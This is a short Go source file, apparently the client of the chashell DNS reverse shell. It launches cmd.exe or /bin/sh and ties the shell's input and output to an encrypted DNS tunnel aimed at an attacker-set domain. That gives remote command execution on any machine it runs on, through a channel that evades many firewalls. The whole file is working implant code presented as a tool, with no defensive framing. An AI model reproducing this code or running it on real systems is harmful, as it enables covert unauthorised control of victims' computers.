package main

import (
	"github.com/hdqb/chashell/lib/transport"
	"os/exec"
	"runtime"
	"fmt"
)

var (
	targetDomain  string
	encryptionKey string
)

func main() {
	var cmd *exec.Cmd

	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd.exe")
	} else {
		cmd = exec.Command("/bin/sh", "-c", "/bin/sh")
	}

	dnsTransport := transport.DNSStream(targetDomain, encryptionKey)

	cmd.Stdout = dnsTransport
	cmd.Stderr = dnsTransport
	cmd.Stdin = dnsTransport
	fmt.Println(dnsTransport)
	err := cmd.Run()
	if err != nil {
		return
	}
}
